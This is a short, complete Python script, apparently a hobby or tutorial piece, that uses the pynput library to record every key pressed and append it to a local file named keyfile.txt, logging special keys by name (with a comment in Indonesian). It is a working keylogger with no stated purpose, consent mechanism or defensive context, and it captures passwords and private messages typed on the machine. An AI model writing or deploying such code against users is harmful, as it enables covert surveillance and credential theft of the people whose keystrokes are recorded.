from pynput import keyboard

def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            # Tulis tombol spesial dalam format [nama_tombol]
            logKey.write(f"[{key.name}]")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
